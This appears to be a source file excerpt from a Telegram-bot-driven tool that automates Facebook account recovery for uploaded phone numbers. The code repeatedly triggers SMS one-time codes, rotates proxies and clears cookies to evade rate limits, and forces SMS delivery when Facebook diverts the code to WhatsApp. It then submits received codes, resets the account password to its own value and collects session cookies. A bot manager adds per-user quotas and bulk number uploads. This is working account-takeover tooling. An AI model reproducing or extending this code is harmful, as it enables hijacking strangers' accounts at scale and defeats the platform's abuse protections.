          const rInit = await safeFetch(postUrl, {
            method: 'POST',
            body: new URLSearchParams(pick.fields).toString(),
            headers: headersForUrl(postUrl, {
              Referer: curUrl,
              Origin: new URL(postUrl).origin,
              'Content-Type': 'application/x-www-form-urlencoded',
            }),
          });
          curUrl = rInit.url || postUrl;
          curHtml = rInit.text || '';
          const lowR = extractFbResponseSignals(curHtml).visibleText.toLowerCase();
          if (!isNonSmsDeliveryScreen(lowR) && (isCodeInputPage(curHtml, curUrl) || /recover\/code|sent your code|enter the \d+-digit code|enter security code/i.test(`${curUrl} ${lowR}`))) {
            return true;
          }
        }
      } catch (err) {
        if (err && err.isProxyError) {
          if (px) badPxSet.add(proxyHealthKey(px));
          const altPx = rotateFreshRecoveryProxy(seedOffset + 1);
          if (altPx) px = altPx;
        }
      }
    }
    return false;
  };

  const sendSmsInitiate = async () => {
    const pick = pickSmsRecoverChoice(curHtml, phone);
    if (!pick.action) return false;
    const postUrl = new URL(pick.action, curUrl).toString();
    const rInit = await safeFetch(postUrl, {
      method: 'POST',
      body: new URLSearchParams(pick.fields).toString(),
      headers: headersForUrl(postUrl, {
        Referer: curUrl,
        Origin: new URL(postUrl).origin,
        'Content-Type': 'application/x-www-form-urlencoded',
      }),
    });
    curUrl = rInit.url || postUrl;
    curHtml = rInit.text || '';
    const s = extractFbResponseSignals(curHtml);
    if (!isCodeInputPage(curHtml, curUrl) && s.redirectUris && s.redirectUris.length > 0) {
      const codeRedir = s.redirectUris.find((ru) => /\/recover\/code/i.test(ru)) || s.redirectUris[0];
      if (codeRedir) {
        const nextU = new URL(codeRedir, curUrl).toString();
        const rCodePage = await safeFetch(nextU, { headers: headersForUrl(nextU, { Referer: curUrl }) });
        if (rCodePage.status < 400 && (rCodePage.text || '').length > 180) {
          curUrl = rCodePage.url || nextU;
          curHtml = rCodePage.text || curHtml;
        }
      }
    }
    let s2 = extractFbResponseSignals(curHtml);
    let low = `${s2.visibleText} ${s2.errTexts.join(' ')}`.toLowerCase();
    // Anti-WhatsApp divert on initial step: if Meta diverted to WhatsApp/email/device, force "Try another way -> SMS"
    if (isNonSmsDeliveryScreen(low)) {
      const tryLink = String(curHtml || '').replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '').match(/<a\b[^>]*href=["']([^"']*\/recover\/initiate\/[^"']*)["']/i);
      if (tryLink?.[1]) {
        try {
          const swU = new URL(decodeHtmlAttrs(tryLink[1]), curUrl).toString();
          const rSw = await safeFetch(swU, { headers: headersForUrl(swU, { Referer: curUrl }) });
          if (rSw.status < 400 && (rSw.text || '').length > 180) {
            const smsPick = pickSmsRecoverChoice(rSw.text, phone);
            if (smsPick.action && smsPick.hasSmsRadio) {
              const swAct = new URL(smsPick.action, rSw.url || swU).toString();
              const rSwPost = await safeFetch(swAct, {
                method: 'POST',
                body: new URLSearchParams(smsPick.fields).toString(),
                headers: headersForUrl(swAct, {
                  Referer: rSw.url || swU,
                  Origin: new URL(swAct).origin,
                  'Content-Type': 'application/x-www-form-urlencoded',
                }),
              });
              if (rSwPost.status < 400 && (rSwPost.text || '').length > 120) {
                curUrl = rSwPost.url || swAct;
                curHtml = rSwPost.text || curHtml;
                s2 = extractFbResponseSignals(curHtml);
                low = `${s2.visibleText} ${s2.errTexts.join(' ')}`.toLowerCase();
              }
            }
          }
        } catch {
          // ignore switch error and evaluate below
        }
      }
      if (isNonSmsDeliveryScreen(low)) {
        trace.push('wa-divert(init)');
        return false;
      }
    }
    if (/too many|try again later|rate limit|wait a few minutes|temporarily blocked|going too fast/i.test(low)) {
      rateLimited = true;
      return false;
    }
    return (
      isCodeInputPage(curHtml, curUrl) ||
      /recover\/code|sent your code|enter the \d+-digit code|enter security code|sent.*code/i.test(`${curUrl} ${low}`)
    );
  };

  const initVisLow = extractFbResponseSignals(curHtml).visibleText.toLowerCase();
  if (isCodeInputPage(curHtml, curUrl) && !isNonSmsDeliveryScreen(initVisLow)) {
    otpsSent = 1;
    lastMethod = 'recover/code(initial)';
    trace.push('otp-1(auto)');
  } else {
    if (isNonSmsDeliveryScreen(initVisLow)) {
      const tryLink = String(curHtml || '').replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '').match(/<a\b[^>]*href=["']([^"']*\/recover\/initiate\/[^"']*)["']/i);
      if (tryLink?.[1]) {
        try {
          const swU = new URL(decodeHtmlAttrs(tryLink[1]), curUrl).toString();
          const rSw = await safeFetch(swU, { headers: headersForUrl(swU, { Referer: curUrl }) });
          if (rSw.status < 400 && (rSw.text || '').length > 180) {
            curUrl = rSw.url || swU;
            curHtml = rSw.text;
          }
        } catch {
          // ignore
        }
      }
    }
    const sent1 = await sendSmsInitiate().catch(() => false);
    if (sent1) {
      otpsSent = 1;
      lastMethod = 'recover/initiate(SMS)';
      trace.push('otp-1(sms)');
    } else if (/\/recover\/code/i.test(curUrl) && !isNonSmsDeliveryScreen(extractFbResponseSignals(curHtml).visibleText.toLowerCase())) {
      otpsSent = 1;
      lastMethod = 'recover/probe';
      trace.push('otp-1(probe)');
    }
  }

  syncStubState();

  // Check OTP server immediately after Round 1 if a hook is attached
  if (otpsSent > 0 && typeof opts.onAfterOtpSent === 'function') {
    const check1 = await opts.onAfterOtpSent({
      round: 1,
      totalRounds: resendTarget,
      otpsSent,
      usedEntryUrl,
      proxyUsed: px,
      item: { ...itemStub, cookies: { ...itemStub.cookies } },
    });
    if (check1 && check1.stop) {
      delete itemStub._lastConfirmHtml;
      return {
        ok: true,
        earlyMatched: true,
        earlyHit: check1.earlyHit || null,
        loginResult: check1.loginResult || null,
        otpsSent,
        rateLimited,
        via: lastMethod || 'recover',
        usedEntryUrl,
        item: itemStub,
        trace,
      };
    }
  }

  // Step 3: Repeat / Resend Forgot OTP up to resendTarget (1..12x) with per-round proxy rotation & anti-RL clean-cookie re-entry
  for (let round = otpsSent + 1; round <= resendTarget; round++) {
    if (opts.shouldAbort && opts.shouldAbort()) break;
    const roundPaceMs = isFastOtp ? (420 + Math.floor(Math.random() * 260)) : (820 + Math.floor(Math.random() * 460));
    const okWait = await sleepAbort(roundPaceMs, opts.shouldAbort);
    if (!okWait) break;

    let stepOk = false;
    const shouldRotateThisRound = rotatePerRound && (pxPool.length > 0 || Boolean(opts.rawProxy || px));
    const rStep = await performOtpResendOnce(itemStub, { ...cfg, timeout: isFastOtp ? 12 : Math.max(15, Number(cfg.timeout || 22)) }, '', {
      html: curHtml,
      proxiesPool: pxPool,
      badProxies: badPxSet,
      rotateProxy: shouldRotateThisRound,
      proxyIndex: round,
      shouldAbort: opts.shouldAbort,
    });
    if (rStep.ok) {
      otpsSent += 1;
      lastMethod = rStep.via || 'recover/resend';
      curUrl = rStep.confirmUrl || itemStub.confirm_url;
      curHtml = itemStub._lastConfirmHtml || curHtml;
      if (itemStub.proxy) px = itemStub.proxy;
      Object.assign(jar, itemStub.cookies || {});
      syncStubState();
      stepOk = true;
      trace.push(`otp-${round}(${lastMethod.slice(0, 14)})`);
    } else {
      if (rStep.rateLimited) {
        rateLimited = true;
        trace.push(`otp-${round}(RL->rotate)`);
      } else if (rStep.whatsappDivert) {
        trace.push(`otp-${round}(WA->rotate)`);
      }
      // Fallback A: follow "Try another way" (/recover/initiate/) on fresh proxy
      if (!rStep.rateLimited) {
        const cleanCurHtml = String(curHtml || '').replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');
        const tryLink = cleanCurHtml.match(/<a\b[^>]*href=["']([^"']*\/recover\/initiate\/[^"']*)["']/i);
        const fallbackInitUrls = Array.from(
          new Set([
            ...(tryLink?.[1] ? [new URL(decodeHtmlAttrs(tryLink[1]), curUrl).toString()] : []),
            `${new URL(curUrl).origin}/recover/initiate/?ars=facebook_login`,
            'https://limited.facebook.com/recover/initiate/?ars=facebook_login',
            'https://m.facebook.com/recover/initiate/?ars=facebook_login',
          ])
        );
        for (const initUrl of fallbackInitUrls) {
          if (opts.shouldAbort && opts.shouldAbort()) break;
          try {
            const rBack = await safeFetch(initUrl, { headers: headersForUrl(initUrl, { Referer: curUrl }) });
            if (rBack.status < 400 && (rBack.text || '').length > 200) {
              curUrl = rBack.url || initUrl;
              curHtml = rBack.text || '';
              const reSent = await sendSmsInitiate();
              if (reSent) {
                otpsSent += 1;
                lastMethod = 'recover/re-initiate';
                syncStubState();
                stepOk = true;
                trace.push(`otp-${round}(re-init)`);
                break;
              }
            }
          } catch {
            // try next fallback URL
          }
        }
      }

      // Fallback B (Anti-RateLimit / WhatsApp-Divert / Expired Session): Wipe cookies + Rotate Country Proxy IP + Clean Re-Initiate!
      if (!stepOk && (pxPool.length > 0 || opts.rawProxy || cfg.proxy || rStep.whatsappDivert || rStep.rateLimited || rStep.sessionExpired)) {
        const cleanOk = await reEnterCleanRecoverySms(round + 7).catch(() => false);
        if (cleanOk) {
          otpsSent += 1;
          lastMethod = 'recover/clean-proxy-reinit';
          rateLimited = false;
          syncStubState();
          stepOk = true;
          trace.push(`otp-${round}(clean-px)`);
        }
      }

      if (!stepOk) {
        trace.push(`otp-${round}(stop:${(rStep.reason || 'no-link').slice(0, 18)})`);
        break;
      }
    }

    if (stepOk && typeof opts.onAfterOtpSent === 'function') {
      const checkN = await opts.onAfterOtpSent({
        round,
        totalRounds: resendTarget,
        otpsSent,
        usedEntryUrl,
        proxyUsed: px,
        item: { ...itemStub, cookies: { ...itemStub.cookies } },
      });
      if (checkN && checkN.stop) {
        delete itemStub._lastConfirmHtml;
        return {
          ok: true,
          earlyMatched: true,
          earlyHit: checkN.earlyHit || null,
          loginResult: checkN.loginResult || null,
          otpsSent,
          rateLimited,
          via: lastMethod || 'recover',
          usedEntryUrl,
          item: itemStub,
          trace,
        };
      }
    }
  }

  delete itemStub._lastConfirmHtml;
  itemStub.resendCount = otpsSent;
  itemStub.cookies = orderCookies(jar);
  itemStub.confirm_url = curUrl;
  return {
    ok: otpsSent > 0,
    otpsSent,
    rateLimited,
    via: lastMethod || 'recover',
    usedEntryUrl,
    err: otpsSent > 0 ? undefined : rateLimited ? 'Facebook rate-limited SMS OTP requests' : 'Could not trigger Forgot Password SMS OTP',
    item: itemStub,
    trace,
  };
}

async function submitRecoveryOtpAndLogin(item, code, newPwInput, cfg) {
  const jar = { ...(item.cookies || {}) };
  let px = (item.proxy || cfg.proxy || '').trim() || null;
  const strictProxy = cfg.strict_proxy !== false;
  const ua = item.ua || LITE_UA;
  const newPass = String(newPwInput || item.pass || cfg.password || `FbClone@${Math.floor(1000 + Math.random() * 8999)}`).trim();
  const timeoutMs = Math.max(18000, ((cfg.timeout || 25) + 5) * 1000);

  let confirmUrl = item.confirm_url || 'https://limited.facebook.com/recover/code/';
  let act = item.action || '';
  let flds = { ...(item.fields || {}) };

  const safeFetch = async (url, fOpts = {}) => {
    const mergedHeaders = {
      Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-dest': 'document',
      'sec-fetch-site': 'same-origin',
      'upgrade-insecure-requests': '1',
      ...(fOpts.headers || {}),
    };
    return await fetchWithJar(url, jar, {
      preferCurl: true,
      ...fOpts,
      headers: mergedHeaders,
      timeoutMs,
      proxy: px,
      strictProxy,
      ua,
    });
  };

  if (!act) {
    try {
      const rGet = await safeFetch(confirmUrl);
      confirmUrl = rGet.url || confirmUrl;
      const pf = readForm(rGet.text || '', 'otp');
      act = pf.action;
      flds = Object.fromEntries(Object.entries(pf.inputs || {}).map(([k, v]) => [k, v[1]]));
    } catch (err) {
      return { status: 'FAIL', err: err instanceof Error ? err.message : 'Network error' };
    }
  }
  if (!act) {
    return { status: 'FAIL', err: 'No recovery OTP form available' };
  }

  const otpField = OTP_FIELDS.find((k) => k in flds) || 'n';
  flds[otpField] = String(code || '').trim();
  const postAct = new URL(act, confirmUrl).toString();
  let rCode;
  try {
    rCode = await safeFetch(postAct, {
      method: 'POST',
      body: new URLSearchParams(flds).toString(),
      headers: {
        Referer: confirmUrl,
        Origin: new URL(postAct).origin,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    });
  } catch (err) {
    return { status: 'FAIL', err: err instanceof Error ? err.message : 'OTP submit error' };
  }

  let curUrl = rCode.url || postAct;
  let body = rCode.text || '';
  const sigCode = extractFbResponseSignals(body);
  if (!/password_new|new_pass|\/recover\/password/i.test(`${curUrl}\n${body}`) && sigCode.redirectUris?.length) {
    const pwRedir = sigCode.redirectUris.find((ru) => /\/recover\/password|password/i.test(ru));
    if (pwRedir) {
      try {
        const nextU = new URL(pwRedir, curUrl).toString();
        const rRedir = await safeFetch(nextU, { headers: { Referer: curUrl } });
        if (rRedir.status < 400 && (rRedir.text || '').length > 120) {
          curUrl = rRedir.url || nextU;
          body = rRedir.text || body;
        }
      } catch {
        // continue with current response
      }
    }
  }

  const visLow = extractVisibleText(body).toLowerCase();

  if (WRONG_CODE_WORDS.some((w) => visLow.includes(w))) {
    return { status: 'WRONG' };
  }

  // Handle "Choose a New Password" page (/recover/password/)
  if (/password_new|new_pass|new_password|\/recover\/password/i.test(`${curUrl}\n${body}`)) {
    const pwForm = readForm(body, 'reg');
    const pwFields = Object.fromEntries(Object.entries(pwForm.inputs || {}).map(([k, v]) => [k, v[1]]));
    const pwKey = Object.keys(pwFields).find((k) => /password_new|new_pass|new_password|pass/i.test(k)) || 'password_new';
    pwFields[pwKey] = newPass;
    if ('password_confirm' in pwFields) pwFields.password_confirm = newPass;
    const pwAct = new URL(pwForm.action || curUrl, curUrl).toString();
    try {
      const rPw = await safeFetch(pwAct, {
        method: 'POST',
        body: new URLSearchParams(pwFields).toString(),
        headers: {
          Referer: curUrl,
          Origin: new URL(pwAct).origin,
          'Content-Type': 'application/x-www-form-urlencoded',
        },
      });
      curUrl = rPw.url || pwAct;
      body = rPw.text || '';
    } catch (err) {
      return { status: 'FAIL', err: err instanceof Error ? err.message : 'Password reset step failed' };
    }
  }

  // Handle optional "Stay logged in / Log out of other devices" prompt
  if (/logout_other|keep_sessions|session_invalidate/i.test(body)) {
    try {
      const sForm = readForm(body, 'reg');
      if (sForm.action) {
        const sFields = Object.fromEntries(Object.entries(sForm.inputs || {}).map(([k, v]) => [k, v[1]]));
        const sAct = new URL(sForm.action, curUrl).toString();
        const rStay = await safeFetch(sAct, {
          method: 'POST',
          body: new URLSearchParams(sFields).toString(),
          headers: { Referer: curUrl, Origin: new URL(sAct).origin, 'Content-Type': 'application/x-www-form-urlencoded' },
        });
        curUrl = rStay.url || sAct;
        body = rStay.text || '';
      }
    } catch {
      // ignore non-fatal continuation error
    }
  }

  if (jar.c_user && jar.xs) {
    return { status: 'OK', uid: jar.c_user, pass: newPass, cookies: orderCookies(jar) };
  }

  // Attempt fresh direct login with recovered phone + new password so full c_user + xs cookies are issued
  const loggedUid = await loginUid(item.phone, newPass, cfg, jar, px);
  if (loggedUid && jar.xs) {
    return { status: 'OK', uid: loggedUid, pass: newPass, cookies: orderCookies(jar) };
  }
  const directUid = jar.c_user || extractUidFromHtml(body, curUrl);
  if (directUid && jar.xs) {
    jar.c_user = directUid;
    return { status: 'OK', uid: directUid, pass: newPass, cookies: orderCookies(jar) };
  }
  if (directUid || loggedUid) {
    const uidOut = directUid || loggedUid;
    jar.c_user = uidOut;
    if (Object.keys(jar).length > 0) {
      return { status: 'OK', uid: uidOut, pass: newPass, cookies: orderCookies(jar) };
    }
  }

  const nextF = readForm(body, 'otp');
  if (nextF.action && (OTP_FIELDS.some((k) => k in nextF.inputs) || /checkpoint|recover\/code/i.test(`${curUrl} ${nextF.action}`))) {
    item.action = nextF.action;
    item.fields = Object.fromEntries(Object.entries(nextF.inputs || {}).map(([k, v]) => [k, v[1]]));
    item.cookies = orderCookies(jar);
    item.confirm_url = curUrl;
    item.pass = newPass;
    return { status: 'RETRY', item };
  }

  return { status: 'FAIL', err: 'OTP accepted or expired, but Facebook blocked session cookie issue (checkpoint/2FA).' };
}

// ----------------------------------------------------------------------------
// 6. Multi-User Telegram Bot Manager
// ----------------------------------------------------------------------------
function createStandaloneBot(botToken) {
  const DEFAULT_SETTINGS = {
    brandName: DEFAULT_BRAND_NAME,
    adminId: DEFAULT_ADMIN_ID,
    adminUsername: DEFAULT_ADMIN_USERNAME,
    ownerUrl: DEFAULT_OWNER_URL,
    channelUrl: DEFAULT_CHANNEL_URL,
    requireApproval: false,
    requireChannelJoin: false,
    maintenanceMode: false,
    defaultDailyLimit: 25,
    defaultEngineMode: 'hybrid',
    defaultPrecheckGql: true,
    shareGlobalProxies: true,
    numberValidMinutes: 10,
    globalLamixToken: '',
    globalLamixCleared: false,
    globalVoltexKeys: [],
    globalVoltexBaseUrl: '',
    globalVoltexDisabled: false,
    _apiKeysMigrated: false,
    welcomeNote: `Welcome to ${DEFAULT_BRAND_NAME} Multi-User Automation Hub. Channel: ${DEFAULT_CHANNEL_URL}`,
  };

  const MAX_NUMBER_UPLOAD_BYTES = 10 * 1024 * 1024;
  const MAX_NUMBERS_PER_UPLOAD = 100000;
  const API_MAX_RESPONSE_BYTES = 1024 * 1024;
  const API_MAX_ROWS = 500;
  const API_BLOCK_RETRY_SECONDS = 30;
  const API_SMS_CACHE_TTL_MS = 3000;

  function getChannelHandle(url) {
    const raw = String(url || DEFAULT_CHANNEL_URL).trim();
    if (raw.startsWith('@')) return raw;
    const m = raw.match(/t\.me\/([A-Za-z0-9_]+)/i);
    return m ? `@${m[1]}` : raw;
  }

  function normalizeTgLink(input, fallbackUrl) {
    const raw = String(input || '').trim();
    if (!raw) return { handle: DEFAULT_ADMIN_USERNAME, url: fallbackUrl };
    if (/^https?:\/\//i.test(raw)) {
      const m = raw.match(/t\.me\/([A-Za-z0-9_]+)/i);
      return { handle: m ? `@${m[1]}` : raw, url: raw };
    }
    if (/^t\.me\//i.test(raw)) {
      const clean = raw.replace(/^t\.me\//i, '').replace(/\/+$/, '');
      return { handle: `@${clean.replace(/^@/, '')}`, url: `https://t.me/${clean.replace(/^@/, '')}` };
    }
    const clean = raw.replace(/^@/, '');
    return { handle: `@${clean}`, url: `https://t.me/${clean}` };
  }

  function isUserAdmin(user, st) {
    return Boolean(user && (user.id === st.adminId || user.id === DEFAULT_ADMIN_ID || user.role === 'admin'));
  }

  let running = false;
  let connected = false;
  let botInfo = null;
  let lastError = '';
  let startedAt = null;
  let pollAbort = null;
  let offset = 0;

  const logs = [];
  const promptSessions = new Map();
  const activeRuns = new Map();
  const pcBatchState = new Map();
  const normalizedCache = new Map();
  const normalizedFreeCache = new Map();
  const normalizedTakenCache = new Map();
  const tgRegisteredCache = new Map();
  const tgUnregisteredCache = new Map();

  const channelMemberCache = new Map();
  let settingsCache = null;
  let usersMapCache = null;
  let usersMapLastDiskWrite = 0;

  function pushBotLog(msg) {
    const line = appendDebugLog(`[TG-BOT] ${msg}`);
    logs.push(line);
    if (logs.length > 200) logs.splice(0, logs.length - 200);
    console.log(line);
  }

  function readSettings() {
    if (settingsCache) return settingsCache;
    try {
      if (fs.existsSync(FILES.botSettings)) {
        settingsCache = { ...DEFAULT_SETTINGS, ...JSON.parse(fs.readFileSync(FILES.botSettings, 'utf-8')) };
        return settingsCache;
      }
    } catch {
      // ignore
    }
    settingsCache = { ...DEFAULT_SETTINGS };
    return settingsCache;
  }

  function writeSettings(patch) {
    const merged = { ...readSettings(), ...patch };
    settingsCache = merged;
    fs.writeFileSync(FILES.botSettings, JSON.stringify(merged, null, 2), 'utf-8');
    return merged;
  }

  function readUsersMap() {
    if (usersMapCache) return usersMapCache;
    try {
      if (fs.existsSync(FILES.botUsers)) {
        const parsed = JSON.parse(fs.readFileSync(FILES.botUsers, 'utf-8'));
        if (parsed && typeof parsed === 'object') {
          usersMapCache = parsed;
          return usersMapCache;
        }
      }
    } catch {
      // ignore
    }
    usersMapCache = {};
    return usersMapCache;
  }

  function writeUsersMap(map) {
    usersMapCache = map;
    usersMapLastDiskWrite = Date.now();
    fs.writeFileSync(FILES.botUsers, JSON.stringify(map, null, 2), 'utf-8');
  }

  function ensureAdminSeed() {
    const st = readSettings();
    const map = readUsersMap();
    const today = new Date().toISOString().slice(0, 10);
    if (st.adminId && !map[st.adminId]) {
      map[st.adminId] = {
        id: st.adminId,
        username: st.adminUsername.replace(/^@/, ''),
        firstName: 'Admin',
        role: 'admin',
        status: 'approved',
        dailyLimit: 9999,
        usedToday: 0,
        lastResetDate: today,
        totalOk: 0,
        totalPending: 0,
        totalFail: 0,
        joinedAt: Date.now(),
        lastActiveAt: Date.now(),
      };
      writeUsersMap(map);
    }
  }
  ensureAdminSeed();

  function ensureGlobalApiKeysMigrated() {
    const st = readSettings();
    if (st._apiKeysMigrated) return;
    let nextLamix = String(st.globalLamixToken || '').trim();
    let nextVoltex = Array.isArray(st.globalVoltexKeys) ? st.globalVoltexKeys.filter(Boolean) : [];
    const candidateIds = Array.from(new Set([st.adminId, DEFAULT_ADMIN_ID].filter(Boolean)));
    for (const aid of candidateIds) {
      try {
        const cfgFile = path.join(FILES.botUsersDir, String(aid), 'config.json');
        if (!fs.existsSync(cfgFile)) continue;
        const parsed = JSON.parse(fs.readFileSync(cfgFile, 'utf-8'));
        if (!nextLamix && parsed?.lamix_token) {
          nextLamix = String(parsed.lamix_token).trim();
        }
        if (nextVoltex.length === 0 && Array.isArray(parsed?.fb_tools_2oo9_keys) && parsed.fb_tools_2oo9_keys.length > 0) {
          nextVoltex = parsed.fb_tools_2oo9_keys.map((k) => String(k || '').trim()).filter(Boolean);
        }
      } catch {
        // ignore
      }
    }
    if (!nextLamix && process.env.LAMIX_TOKEN) nextLamix = String(process.env.LAMIX_TOKEN).trim();
    writeSettings({
      globalLamixToken: nextLamix,
      globalVoltexKeys: nextVoltex,
      _apiKeysMigrated: true,
    });
  }
  ensureGlobalApiKeysMigrated();

  function getUserDir(userId) {
    const uid = String(userId).trim();
    if (!/^\d{1,20}$/.test(uid)) throw new Error('Invalid Telegram user ID');
    const resolved = path.resolve(FILES.botUsersDir, uid);
    if (!resolved.startsWith(FILES.botUsersDir + path.sep)) throw new Error('Path confinement violation');
    if (!fs.existsSync(resolved)) fs.mkdirSync(resolved, { recursive: true });
    return resolved;
  }

  function getUserFiles(userId) {
    const dir = getUserDir(userId);
    return {
      config: path.join(dir, 'config.json'),
      pending: path.join(dir, 'pending.json'),
      accountsJsonl: path.join(dir, 'accounts.jsonl'),
      accountsTxt: path.join(dir, 'accounts.txt'),
      successTxt: path.join(dir, 'success.txt'),
      proxies: path.join(dir, 'proxies.txt'),
      cookies: path.join(dir, 'base_cookies.txt'),
      done: path.join(dir, 'done.txt'),
      debugLog: path.join(dir, 'debug.log'),
      debugHtml: path.join(dir, 'last_debug.html'),
    };
  }

  function appendUserLog(uid, msg) {
    try {
      const files = getUserFiles(uid);
      const ts = new Date().toISOString().replace('T', ' ').slice(11, 19);
      fs.appendFileSync(files.debugLog, `[${ts}] ${msg}\n`, 'utf-8');
    } catch {
      // ignore
    }
  }

  function readUserLogs(uid, limit = 30) {
    try {
      const files = getUserFiles(uid);
      if (!fs.existsSync(files.debugLog)) return [];
      return fs.readFileSync(files.debugLog, 'utf-8').split(/\r?\n/).filter(Boolean).slice(-limit);
    } catch {
      return [];
    }
  }

  function clearUserLogs(uid) {
    try {
      const files = getUserFiles(uid);
      fs.writeFileSync(files.debugLog, '', 'utf-8');
      if (fs.existsSync(files.debugHtml)) fs.writeFileSync(files.debugHtml, '', 'utf-8');
    } catch {
      // ignore
    }
  }

  function saveUserDebugHtml(uid, html) {
    if (!html) return;
    try {
      const files = getUserFiles(uid);
      fs.writeFileSync(files.debugHtml, html.slice(0, 12000), 'utf-8');
    } catch {
      // ignore
    }
  }

  function getOrCreateUser(tgUser) {
    const st = readSettings();
    const uid = String(tgUser.id);
    const isAdmin = uid === st.adminId;
    const today = new Date().toISOString().slice(0, 10);
    const map = readUsersMap();
    const existing = map[uid];

    if (!existing) {
      const rec = {
        id: uid,
        username: tgUser.username || '',
        firstName: tgUser.first_name || 'User',
        role: isAdmin ? 'admin' : 'user',
        status: isAdmin || !st.requireApproval ? 'approved' : 'pending',
        dailyLimit: isAdmin ? 9999 : st.defaultDailyLimit,
        usedToday: 0,
        lastResetDate: today,
        totalOk: 0,
        totalPending: 0,
        totalFail: 0,
        joinedAt: Date.now(),
        lastActiveAt: Date.now(),
      };
      map[uid] = rec;
      writeUsersMap(map);
      return rec;
    }

    const prevUsername = existing.username;
    const prevFirstName = existing.firstName;
    const prevResetDate = existing.lastResetDate;
    const prevRole = existing.role;
    const prevStatus = existing.status;

    if (tgUser.username !== undefined) existing.username = tgUser.username;
    if (tgUser.first_name) existing.firstName = tgUser.first_name;
    const now = Date.now();
    existing.lastActiveAt = now;
    if (existing.lastResetDate !== today) {
      existing.usedToday = 0;
      existing.lastResetDate = today;
    }
    if (isAdmin) {
      existing.role = 'admin';
      existing.status = 'approved';
    }
    map[uid] = existing;
    const changed =
      prevUsername !== existing.username ||
      prevFirstName !== existing.firstName ||
      prevResetDate !== existing.lastResetDate ||
      prevRole !== existing.role ||
      prevStatus !== existing.status;
    if (changed || now - usersMapLastDiskWrite > 60000) {
      writeUsersMap(map);
    }
    return existing;
  }

  function canConsumeQuota(uid, count = 1) {
    const st = readSettings();
    const uMap = readUsersMap();
    const user = uMap[uid];
    if (!user) return { ok: true, remaining: 999 };
    if (isUserAdmin(user, st)) return { ok: true, remaining: 9999 };
    const remaining = Math.max(0, (user.dailyLimit || 25) - (user.usedToday || 0));
    if (remaining < count) return { ok: false, remaining };
    return { ok: true, remaining };
  }

  function consumeQuota(uid, count = 1) {
    const uMap = readUsersMap();
    if (uMap[uid]) {
      uMap[uid].usedToday = (uMap[uid].usedToday || 0) + count;
      writeUsersMap(uMap);
    }
  }

  function getEffectiveProxyPool(uid) {
    const st = readSettings();
    const userProxies = readUserProxies(uid);
    if (userProxies.length > 0) return userProxies;
    if (st.shareGlobalProxies) return readGlobalProxies();
    return [];
  }

  function readUserConfig(uid) {
    const files = getUserFiles(uid);
    const st = readSettings();
    const base = {
      ...DEFAULT_CONFIG,
      engine_mode: st.defaultEngineMode || DEFAULT_CONFIG.engine_mode,
      precheck_gql: st.defaultPrecheckGql !== false,
    };
    try {
      if (fs.existsSync(files.config)) {
        const merged = { ...base, ...JSON.parse(fs.readFileSync(files.config, 'utf-8')) };
        merged.proxy = merged.proxy ? validateProxyUrl(merged.proxy) || '' : '';
        merged.auto_proxy_refresh = merged.auto_proxy_refresh !== false;
        merged.auto_proxy_country = merged.auto_proxy_country !== false;
        merged.proxy_saver = merged.proxy_saver !== false;
        merged.gql_via_direct = merged.gql_via_direct !== false;
        merged.checker_use_proxy = Boolean(merged.checker_use_proxy);
        const rawResend = Number(merged.auto_otp_resend);
        merged.auto_otp_resend = Number.isFinite(rawResend) ? Math.max(0, Math.min(3, Math.round(rawResend))) : 2;
        const rawPcResend = Number(merged.pc_otp_resends);
        merged.pc_otp_resends = Number.isFinite(rawPcResend) ? Math.max(1, Math.min(12, Math.round(rawPcResend))) : 3;
        merged.pc_recovery_urls = normalizePcRecoveryUrls(merged.pc_recovery_urls, { fallbackToDefaults: true });
        merged.fb_tools_2oo9_keys = Array.isArray(merged.fb_tools_2oo9_keys)
          ? merged.fb_tools_2oo9_keys.map((k) => String(k || '').trim()).filter(Boolean)
          : [];
        merged.fb_tools_human_delay = merged.fb_tools_human_delay === true;
        const rawFbToolsResend = Number(merged.fb_tools_otp_resends);
        merged.fb_tools_otp_resends = Number.isFinite(rawFbToolsResend)
          ? Math.max(1, Math.min(10, Math.round(rawFbToolsResend)))
          : 5;
        merged.fb_tools_auto_replace = merged.fb_tools_auto_replace !== false;
        if (!['2oo9', 'pool', 'lamix', 'custom'].includes(merged.fb_tools_source)) {
          merged.fb_tools_source = '2oo9';
        }
        return merged;
      }
    } catch {
      // ignore
    }
    return base;
  }

  function writeUserConfig(uid, patch) {
    const files = getUserFiles(uid);
    const next = { ...readUserConfig(uid), ...patch };
    fs.writeFileSync(files.config, JSON.stringify(next, null, 2), 'utf-8');
    return next;
  }

  function readUserCookies(uid) {
    const files = getUserFiles(uid);
    try {
      if (fs.existsSync(files.cookies)) {
        const raw = fs.readFileSync(files.cookies, 'utf-8').trim();
        if (raw) return normalizeBaseCookiesRaw(raw);
      }
    } catch {
      // ignore
    }
    const fresh = normalizeBaseCookiesRaw('');
    fs.writeFileSync(files.cookies, fresh, 'utf-8');
    return fresh;
  }

  function writeUserCookies(uid, raw) {
    const files = getUserFiles(uid);
    const normalized = normalizeBaseCookiesRaw(raw);
    fs.writeFileSync(files.cookies, normalized, 'utf-8');
    return normalized;
  }

  function regenUserCookies(uid) {
    const files = getUserFiles(uid);
    const fresh = normalizeBaseCookiesRaw('');
    fs.writeFileSync(files.cookies, fresh, 'utf-8');
    return fresh;
  }

  function wipeUserCookiesAndCache(uid) {
    const fresh = regenUserCookies(uid);
    clearUserDone(uid);
    clearUserLogs(uid);
    normalizedCache.delete(uid);
    normalizedFreeCache.delete(uid);
    normalizedTakenCache.delete(uid);
    const otherRunning = Array.from(activeRuns.entries()).some(([k, r]) => k !== uid && r?.running);
    if (!otherRunning) {
      gqlSessionCache = null;
      proxyHealth.clear();
      dynamicProxyTagBlacklist.clear();
    }
    return { fresh };
  }

  function wipeAllUserData(uid) {
    const res = wipeUserCookiesAndCache(uid);
    writeUserPending(uid, []);
    clearUserAccounts(uid);
    writeUserProxies(uid, []);
    promptSessions.delete(uid);
    const map = readUsersMap();
    if (map[uid]) {
      map[uid].totalPending = 0;
      writeUsersMap(map);
    }
    return res;
  }

  function readUserProxies(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.proxies)) return [];
      return parseProxyLines(fs.readFileSync(files.proxies, 'utf-8'));
    } catch {
